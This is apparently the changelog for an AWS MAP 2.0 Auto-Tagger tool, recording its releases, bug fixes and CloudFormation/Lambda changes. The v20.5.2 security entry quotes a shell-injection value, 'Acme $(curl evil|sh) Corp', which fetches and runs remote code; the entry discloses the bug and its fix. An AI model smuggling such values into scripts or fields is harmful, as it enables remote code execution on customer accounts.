# Changelog

All notable changes to the MAP 2.0 Auto-Tagger.

---

## v20 — Resilient SQS Pipeline + Open Source

### v20.6.0 — Configurator delete.sh flow (PR #48b)

**New feature.** MINOR bump per SemVer — safe in-place upgrade for existing deployments (the YAML runtime is byte-identical to v20.5.4 except for the four version stamps; this PR adds a new configurator UI mode and a new generated script).

**Why:** there was no first-class way to remove a MAP Auto-Tagger deployment. Customers either hand-wrote `delete-stack` / `delete-stack-set` invocations or deleted via the CloudFormation console without consistent coverage of the staging S3 bucket and log groups. Missing in particular: deciding whether the bucket should stay (other deployments may still need it) versus go.

**What you get:** a fourth mode card in `configurator.html` — "Delete existing deployment". Three-step flow (Configure → Review → Download) mirroring Deploy / Editor / Upgrade. Generates `delete-all.sh` (or `delete-<mpe1>-<mpe2>.sh` when scoped to specific MPEs). The script:

- Enumerates matching CloudFormation deployments in the selected region (`map-auto-tagger-mig*`, both single-account Stacks and multi-account StackSets).
- Deletes StackSet instances in parallel (100% tolerance, region parallel), waits ≤30min, then deletes the StackSet itself. For single-account Stacks, runs `delete-stack` and waits for completion.
- Inspects the S3 staging bucket `auto-map-tagger-${ACCOUNT}`: **deleted only if no other MAP Auto-Tagger deployments remain**. Otherwise retained so sibling deployments don't break. Race caveat: two simultaneous scoped delete runs could each see the other's stack and both keep the bucket. Accepted — same class as the TOCTOU window we documented in §1.108.
- Optional opt-in: also delete CloudWatch Log Groups matching `/aws/lambda/map-auto-tagger*`. Off by default because logs are audit history.
- **Never deletes:** `map-migrated` tags on AWS resources (MAP credits remain intact), or StackSet admin/execution IAM roles (shared org scaffolding).

Confirmation: customer types `DELETE` (uppercase) before generation — works for both "delete all" and "delete one MPE" paths (mirrors `delete-stack-set` CLI ergonomics).

Idempotent: missing resources are reported as skipped, not failures. Exit code is non-zero only if at least one targeted resource failed to delete.

**Legacy pre-namespacing detection:** if no `map-auto-tagger-mig*` matches but an unnamespaced `map-auto-tagger` stack (pre-v19) exists in the region, the script prints a clear "delete manually with these commands" message instead of silently exiting. Same pattern as v20.5.4's upgrade.sh.

**MPE ID regex in the UI:** permissive — matches the Lambda runtime's `^mig[a-zA-Z0-9]+$` pattern (alphanumeric of any length after the `mig` prefix). Will tighten to `^mig[a-z0-9]{10}$` (H6 follow-up) once the YAML-side regex decision lands across the repo.

**Limits, accepted:** no pre-delete scope-overlap preflight (the deploy-side scope-intersection preflight from PR #38 protects the other direction). No dry-run mode — idempotency + the typed confirmation are the dry-run equivalent.

**Compat:** v20.6.0 customers running the configurator Delete mode do not need to upgrade the YAML template first. The delete flow targets whatever `map-auto-tagger-mig*` happens to be deployed, regardless of version. Customers on v20.5.4 and earlier can safely use a v20.6.0-generated `delete.sh` against their older deployments.

English-only for the new i18n keys (`ui_mode_delete_title`, `ui_delete_*`, `err_delete_*`); 7 non-English locales fall back to English via existing `t()` behavior. Translation follow-up flagged.

No Layer 2 E2E in this PR — the E2E harness for delete.sh ships as PR #48c per Sprint 7 P3 mandate.

Co-authored-by: Jin Shan Ng (Wave-0 scope, aws-samples PR #27 commits `b034c93` + `a392cea`).

### v20.5.4 — Rename Upgrade-mode output `update.sh` → `upgrade.sh` (PR #48a)

Tooling-only; YAML byte-identical to v20.5.3 except for the four version stamps. No runtime Lambda change. Customers who have already deployed are not affected. Customers running `upgrade.sh` next should re-download from the configurator.

**The collision:** the configurator's Upgrade-mode flow (which replaces Lambda code / IAM / EventBridge to the latest template version) and its Editor-mode flow (which adds or removes accounts from scope without redeploying) both generated a file named `update.sh`. A customer running both flows would get two downloads with the same filename and no way to distinguish "upgrade version" from "change account scope" by name. Renames the Upgrade-mode output to `upgrade.sh`; Editor-mode continues to emit `update.sh`.

Renames are cosmetic — the script body is unchanged, SSM paths are unchanged, CFN resource names are unchanged. A customer with an `update.sh` on disk from v20.5.3 can still run it; it will work identically to v20.5.4's `upgrade.sh`.

Co-authored-by: Jin Shan Ng (aws-samples PR #27 proposal).

### v20.5.3 — Generated update.sh — fix `--use-previous-parameters` (PR #47)

**Severity: high** (every customer upgrade attempt failed on first run). No runtime Lambda change; YAML is byte-identical to v20.5.2 except for the four version stamps.

**The bug (U1):** `configurator.html`'s upgrade-flow generator produced an `update.sh` that called `aws cloudformation update-stack` and `update-stack-set` with `--use-previous-parameters`. That flag does not exist on either command in AWS CLI v2 (only `--use-previous-template`, which is a different thing). Both call sites failed with `Unknown options: --use-previous-parameters`. PR #26 shipped this broken; any customer who downloaded update.sh and tried to upgrade hit the error immediately.

**The fix:** the generated script now calls `describe-stack-set` / `describe-stacks` first to enumerate the current parameter keys, then builds a `--parameters ParameterKey=<K>,UsePreviousValue=true ...` list dynamically. Each existing parameter value is carried forward. Newly-added template parameters (for example `ReconciliationInterval` from v20.5.0) pick up the new template's `Default` automatically because they are omitted from the `--parameters` list — this is the CFN-documented behavior. If the describe call returns an empty result, the script aborts with a clear error rather than proceeding with an empty parameter list.

Affects only the `update.sh` generator; deploy.sh and the in-place scope-edit editor flow are unchanged.

### v20.5.2 — Security: generator-side shell-injection fix (PR #46)

**Security class: supply-chain RCE.** Severity: high. No runtime Lambda change; the YAML template is byte-identical to v20.5.1. Customers who already deployed are NOT affected. Customers generating a fresh `deploy.sh` should re-download from the configurator before next deploy.

**The bug (U4):** `configurator.html` emitted the customer-name field into the generated `deploy.sh` as `CUSTOMER="${customerDisplay}"`, inside double quotes. The JS-side escape only neutralized single quotes. In double-quoted bash, `$(...)`, backticks, `\`, and `$VAR` all still expand. A partner-supplied customer name like `Acme $(curl evil|sh) Corp` would execute the subshell when the customer pasted the generated script into CloudShell — arbitrary code at AdministratorAccess on the customer's management account.

**The fix:** customer-name now emits as `CUSTOMER=${customerDisplay}` (no surrounding quotes) where `customerDisplay` is the output of a `shellSingleQuote` helper that wraps the value in single quotes and escapes embedded single quotes via the canonical `'\''` close-insert-reopen pattern. CR/LF are stripped so a newline cannot escape a shell comment either. Applies to both the single-account and multi-account deploy.sh generators.

**Guardrail:** new Layer 1 CI check `Shell Injection Guard` (`lint_shell_injection.py`) fails the build if the double-quoted customer-value shape is reintroduced. Verified against the regression — reintroducing `CUSTOMER="${customerDisplay}"` fails the check on both emit sites.

### v20.5.1 — Hygiene fixes (SSM TTL, events:TagResource, ConfigParameter output)

Three independent correctness fixes (PR #44). No new capability — tightens existing code against latent failure classes.

**Fixes:**

- **Config SSM cache now has a 60-second TTL.** Previously `_config` was populated on first cold-start call and never invalidated. Warm containers live ~15 min, so an MPE rotation via SSM would be silently misattributed to the old MPE for up to one container lifetime. 60 s bounds the window without meaningful extra SSM load.
- **Added `events:TagResource` IAM permission.** `ServiceSpecificTagging` previously listed only `iotevents:TagResource` (IoT Events, a different service). Tagging a newly-created EventBridge rule / bus / schedule / connection AccessDenied, silently landing in the permanent-actionable DLQ path. Applies to both YAML + configurator-generated templates.
- **CFN Output `ConfigParameter` now returns the real parameter path.** Previously emitted the literal string `/auto-map-tagger/config` instead of `/auto-map-tagger/<mpe>/config`. Customers following docs to `aws ssm get-parameter --name <output>` got `ParameterNotFound`. Fix uses `!Ref MapConfig` so the output stays in sync if the parameter is ever renamed.

All three were previously tracked in memory as H2 / H4 / H5 from the 2026-04-24 correctness sweep. H1 shipped in PR #35, H3 was closed by PR #37's three-path classifier.

### v20.5.0 — Reconciliation Lambda (daily safety-net)

Adds a second Lambda that runs once per day (configurable via new `ReconciliationInterval` CFN parameter) as a safety-net for silent-failure classes the live tagging Lambda cannot catch. Design locked in PR #36.

**What reconciliation does:**

- Enumerates every taggable resource in-account via `resourcegroupstaggingapi:GetResources` (no 90-day CloudTrail limit).
- For each resource: checks the current `map-migrated` tag value.
- **Missing tag** → synthesizes a CloudTrail-shaped event, sends to existing `EventQueue` SQS → live Lambda tags via its normal three-path classifier.
- **Wrong-MPE value** → same path (always overwrite to our MPE). Architecturally safe because PR #38's Q3 Option D preflight prevents overlapping-scope deploys.
- **Correctly tagged** → no action, counted in metrics.

**What reconciliation does NOT do:**

- Not a replacement for live tagging — live Lambda stays the ~60–90 s fast path; reconciliation is 24h catch-up.
- Not a replacement for `BackfillFunction` — backfill covers the <90-day install window; reconciliation runs alongside for ongoing catch-up. Both ship.
- No cross-account — per-account Lambda (matches StackSet architecture per PR #35).
- No pagination checkpoint / resume state — 15-min Lambda ceiling with `ReconciliationTimeoutCanary` metric at 13 min. Deferred until a >100K-resource customer surfaces (design §9).
- No alert-only mode for wrong-MPE — always overwrites (design §3).

**New CFN resources:** `ReconciliationFunction`, `ReconciliationSchedule`, `ReconciliationRole`, `ReconciliationLogGroup` (RetentionInDays 14 matching #29), `ReconciliationSchedulePermission`.

**New CFN parameter:** `ReconciliationInterval` (default `rate(24 hours)`, min 1 hour).

**New CloudWatch metrics** (namespace `MapAutoTagger`):

- `ReconciliationResourcesScanned` — total resources examined per run
- `ReconciliationMissingTag` — resources without any `map-migrated` tag
- `WrongMpeCorrected` — resources with a different `map-migrated` value (dims: `ExpectedMpe`, `FoundMpe`)
- `ReconciliationTimeoutCanary` — fires at 13 min elapsed (trend detector for >100K-resource accounts)
- `ReconciliationSkippedNoCreationTime` — resources RGTA omits `CreationTime` for
- `ReconciliationConfigInvalid` — malformed SSM config
- `ReconciliationRunAborted` — hard-failed RGTA page (rare)
- `ReconciliationEnqueueFailed` — SQS `SendMessage` failure

**New IAM for reconciliation role** (separate from live Lambda role): `ssm:GetParameter` scoped to `/auto-map-tagger/<mpe>/config`, `tag:GetResources`, `ec2:Describe*` for VPC membership, `sqs:SendMessage` on `EventQueue`, `cloudwatch:PutMetricData` (Condition-scoped to `MapAutoTagger` namespace per PR #37 pattern), `logs:*` on own log group.

**Edge case documented in `docs/design-reconciliation.md` §3:** if a customer deployed before Q3 Option D preflight existed (pre-PR #38) AND has an active overlapping peer tagger in their account, reconciliation's always-overwrite would flap daily against the peer. Pre-Q3 customers should remove or re-scope the peer before enabling reconciliation. New customers (post-Q3) cannot reach this state.

### v20.4.0 — Three-path error classifier + scope-intersection preflight (#37, #38)

**Runtime: three-path error classifier (#37)**

- Replaced the binary transient/permanent error handler with three paths:
  - **TRANSIENT**: re-raise → SQS redelivery (up to 5× × 180s). Unchanged from v20.3.0.
  - **PERMANENT_IGNORABLE**: silent ack + CloudWatch metric. Resources genuinely deleted between create and tag (Terraform rollback, test-infra churn) no longer generate SNS noise. New markers: `NoSuchBucket`, `InvalidInstanceID.NotFound`, `DBInstanceNotFound`, `DBClusterNotFoundFault`, `InvalidVolume.NotFound`.
  - **PERMANENT_ACTIONABLE**: SNS alert + CloudWatch metric + re-raise → `EventDLQ`. Tag-quota exhaustion, IAM drift, unknown-permanent conditions (B.7 class). Customer ops must triage.
- Closes §1.115 (SQS `TagQueue` quota), §1.116 (RGTA tag-quota), §1.117 runtime side, §1.119 (SCP `AccessDenied` runtime drift), §1.120 (noisy alerts for benign resource-deleted).
- New CloudWatch metric `MapAutoTagger/TagFailureByClass` with `ErrorClass` + `MpeId` dimensions — triage class without log-grepping.
- New IAM: `cloudwatch:PutMetricData` scoped via `cloudwatch:namespace` Condition to `MapAutoTagger`.
- Configurator UI: blank Alert Email now surfaces a loud warning with "Deploy anyway" confirmation (7-language i18n). Soft-breaking — customers with alternative alerting (SIEM, cross-account CloudWatch) can proceed. Subscriber can be added later via `scripts/add_subscriber.sh` (shipped in #34) without redeploy.

**Deploy-time: Q3 Option D scope-intersection preflight (#38)**

- Prevents cross-Lambda MPE contamination (§1.108) at deploy time. Every new deploy checks scope overlap against existing `map-auto-tagger-*` stacks in the target account and hard-fails with the specific peer + overlap element if overlap exists.
- Rules: `account/ALL` dominates; same-mode → set intersection on shared account IDs or shared VPC IDs; cross-mode → deploy-account-in-peer-list check.
- Extends PR #23 batched `SimulatePrincipalPolicy` with `cloudformation:ListStacks` + `ssm:GetParameter` so missing IAM fails fast with precise remediation instead of masquerading as a scope conflict.
- Unreadable peer SSM config now hard-fails with specific remediation instead of "treat as full conflict" fallback.
- Out of scope per design: TOCTOU on simultaneous deploys, manual `ssm put-parameter` edits post-deploy, bypass-configurator deploy paths.
- Makes the reconciliation Lambda (planned for v20.5.0) able to safely overwrite wrong-MPE values without risking tag flap against a live peer.

**Design docs (#36)**

- Added `docs/design-reconciliation.md` — locked design for the reconciliation Lambda that will ship as v20.5.0. Captures the "ship alongside BackfillFunction, not instead of" decision, the wrong-MPE always-overwrite semantics, and the post-Q3 architectural guarantees that make overwrite safe.

---

### v20.3.1 — Bug-fix sweep (#29, #30, #33, #34, #35)

Multiple small fixes that did not warrant individual MINOR bumps. Grouped here retroactively for readability; each shipped as its own PR against v20.3.0.

- **#29 Log group retention**: `AutoTaggerLogGroup` now has `DeletionPolicy: Delete` + `UpdateReplacePolicy: Delete` + `RetentionInDays: 14` (previously `90`). Fixes the "redeploy fails with ResourceExistenceCheck because the orphaned log group outlived stack delete" footgun. Closes §1.74.
- **#30 Date pattern**: `AgreementStartDate` CFN `AllowedPattern` tightened from `^\d{4}-\d{2}-\d{2}$` to `^(19|20)\d{2}-(0[1-9]|1[0-2])-(0[1-9]|[12]\d|3[01])$`. Rejects impossible months/days at CFN parameter validation. Lambda `is_after_agreement` + `is_within_agreement` + BackfillFunction now wrap `strptime` in try/except returning `False` on `ValueError` rather than propagating. Closes §1.129, §1.130.
- **#33 Scope fixes (CRITICAL)**: `ScopedAccountIds` and `ScopedVpcIds` CFN `Type: String` → `Type: CommaDelimitedList`. JSON-array rendering fixed to produce true N-element arrays from `"111,222,333"` input. S3 `get_bucket_tagging` bare-except narrowed to `NoSuchTagSet` only — prevents overwriting the customer's existing `TagSet` on throttle / SCP-deny / transient 5xx. `is_in_scope` VPC mode now returns `False` when `vpc_id is None` instead of falling through to account-scope (respects the customer's explicit VPC-scope intent). Closes §1.1/U2, §1.2/U3, §1.3/U5.
- **#34 SNS backfill helper**: new `scripts/add_subscriber.sh <MpeId> <email>` for existing customers who deployed with the SNS topic but no subscriber. INSTRUCTIONS.md monitoring section leads with "Alerts don't fire unless you subscribe." Existing-customer half of §1.117.
- **#35 Cross-account rip-out**: deleted ~62 LOC of unused cross-account boto3 machinery in the Lambda. Cross-account assume was always dead code; the per-account StackSet architecture is the only supported deployment path. Also removes an unbounded-growth cache and a silent `get_service_client` failure mode that caused permanent tag drops on assume-role failure. Resolves H1.

### v20.3.0 — Tier 1 MAP service handlers (#25)

- Added auto-tagging for services on the MAP 2.0 Included Services List that previously had no handler — customers in affected verticals were silently losing credits:
  - **Amazon Keyspaces** (Cassandra-compatible): `CreateKeyspace`
  - **AWS Directory Service**: `CreateDirectory` (Simple AD), `CreateMicrosoftAD` (Managed Microsoft AD)
  - **AWS CloudHSM v2**: `CreateCluster`, `CreateHsm` (HSMs tag through the parent cluster ARN)
- Added IAM permissions: `ds:AddTagsToResource`, `cloudhsm:TagResource`. `cassandra:TagResource` was already granted.
- Added service-specific dispatch for these three services (Resource Groups Tagging API coverage for Keyspaces/DS/CloudHSM is inconsistent; calling the native tag APIs is safer). All three services use distinct API shapes — Keyspaces expects lowercase `{key, value}`, DS and CloudHSM take raw resource IDs instead of ARNs.
- AD Connector (`ConnectDirectory`) intentionally deferred — requires expanding the EventBridge prefix list to admit `Connect*` events, which has broader side effects.
- E2E fixtures deferred to a follow-up PR (CloudHSM cluster initialization is 10–15 minutes, AD provisioning similar; keeping Layer 2 runtime bounded).

### Architecture overhaul: EventBridge → SQS → Lambda

- Replaced direct EventBridge → Lambda invocation with SQS queue (14-day message retention vs EventBridge's 24-hour retry limit)
- Added Dead Letter Queue for events that fail after 5 SQS retries (180s visibility timeout each)
- Added CloudWatch alarm on DLQ depth → SNS notification
- Removed `ReservedConcurrentExecutions` — SQS handles throttling naturally
- SSE-SQS encryption on both queues

### Multi-engagement support

- All resources namespaced by MPE ID (e.g., `map-auto-tagger-mig111`, `/auto-map-tagger/mig111/config`)
- Multiple MAP engagements can coexist in the same organization
- SSM parameter is the single source of truth for MPE ID, scope, and agreement date

### Editor / update.sh workflow

- Added Editor tab to `configurator.html` for day-2 operations
- Generates `update.sh` to add/remove accounts from scope without redeploying
- Supports optional backfill re-run for newly added accounts

### StackSet auto-deployment

- Enabled `AutoDeployment: True` on StackSets — new accounts joining the org automatically receive the Lambda
- Lambda defers to SSM scope parameter for whether to tag — safe for all scoping modes

### Service coverage changes

- Added: EKS `CreateCluster`, OpenSearch managed `CreateDomain`
- Removed 30 non-MAP-eligible services (cross-referenced against official MAP Included Services List, 6 April 2026): Access Analyzer, Amplify, App Runner, Batch, Clean Rooms, CodeArtifact, CodeCommit, CodeGuru, DataZone, Detective, EventBridge, Fraud Detector, GuardDuty, Inspector, IoT Greengrass, IoT TwinMaker, IVS, Lex, Lightsail, Location Service, MWAA, Macie, Q Business, Rekognition, Supply Chain, Transcribe, Verified Permissions, X-Ray
- Reduced Lambda handler count from ~170 to ~140 (faster cold starts)

### Hidden child resource fix (#12)

- **Problem:** `RunInstances` does not emit separate `CreateVolume` or `CreateNetworkInterface` CloudTrail events for EBS volumes and ENIs attached inline at launch. These resources were silently missed.
- **Fix:** `extract_arns_multi` now calls `describe_instances` with a 30s poll to resolve attached EBS volume IDs, and extracts ENI IDs from the `RunInstances` response.
- **Verified:** ElastiCache replication group nodes, EMR cluster EC2 instances, and EKS node group instances all inherit tags from their parent — no fix needed for those.

### New service handlers (#14, #15)

- WAFv2: WebACL, IPSet
- CodeDeploy: Application, DeploymentGroup
- Expanded E2E coverage to 6 additional MAP 2.0 services

### Bug fixes

- Recognize RGTA `ThrottledException` variant (in addition to `ThrottlingException`) in retry and transient error paths (#17)
- SSM parameter ARN missing `/` separator for flat parameter names (#19)
- Nightly cleanup no longer races in-flight E2E runs (#16)

### Performance

- Parallelized StackSet deploy and delete operations — `MaxConcurrentPercentage: 100` (#18)
- Parallelized teardown fan-out per account (#7)

### CI/CD

- GitHub Actions E2E test suite across 9 AWS accounts
- Handler E2E coverage regression gate — PRs that reduce coverage are blocked (#10)
- Per-linked-account StackSet Lambda + tag verification (#11)
- Nightly cleanup workflow for orphaned test resources
- Python syntax, handler regression, and HTML lint checks

### Open source release

- License changed from Apache-2.0 to MIT-0
- Removed internal security review artifacts
- Holmes scan remediation (service name prefixes, technical accuracy)
- PCSR remediation for public release

---

## v19.20–v19.25 — Multi-Account Hardening

### v19.25
- Fix NAT Gateway ARN construction

### v19.24
- Fix SSM OpsCenter OpsItem tagging

### v19.23
- Fix 8 MAP services from Batch B testing

### v19.22
- Fix Bedrock AgentCore, Payment Cryptography, Cloud WAN tagging

### v19.21
- Add 6 new MAP services
- Fix Kinesis Video Stream tagging

### v19.20
- Support delegated administrator accounts for multi-account deployment
- Preflight verifies caller is management account or registered delegated admin

---

## v19.11–v19.19 — E2E Testing & Production Readiness

### v19.19
- Fix StackSet polling race condition in deploy.sh

### v19.18
- Add StackSet completion message in deploy.sh

### v19.17
- Fix StackSet Lambda timeout for large organizations

### v19.16
- Fix 3 bugs from multi-account E2E testing

### v19.15
- Fix 2 bugs found in E2E testing

### v19.14
- Add local AWS CLI as deployment option alongside CloudShell

### v19.13
- Fix all 6 bugs from E2E test review

### v19.12
- S3 bucket cleanup + multi-account bucket documentation

### v19.11
- E2E test fixes — production ready

---

## v19.1–v19.10 — Configurator & i18n

### v19.9–v19.10
- Comprehensive translation for all UI strings (7 languages: EN, KO, JA, ZH, ID, TH, VI)
- Account scoping for multi-account deployments

### v19.8
- Remove Central Lambda option from configurator (simplified architecture)

### v19.7
- Validation for VPC IDs and central account ID

### v19.5–v19.6
- Backfill respects account and VPC scope
- Deployment report sent after backfill completes

### v19.3–v19.4
- i18n support (7 languages)
- Large-scale migration edge cases
- Full i18n coverage for all UI elements

### v19.2
- PCSR remediation — public release preparation

### v19.1
- ACAT finding: add KMS encryption to SNS topic (`alias/aws/sns`)
- Fix EventBridge prefix patterns, ARN extraction for ALB, Glue, Athena, CodeDeploy, ENI, LoadBalancer, TargetGroup
- Fix ASG ARN construction
- 55+ bugs found and fixed in Phase 1 E2E testing

---

## v18 — Initial Release

- CloudFormation template with Lambda auto-tagger
- EventBridge rule matching resource creation events
- `configurator.html` for generating `deploy.sh`
- Single-account and multi-account (StackSet) deployment modes
- SSM Parameter Store for runtime configuration
- SNS alerting on tagging failures
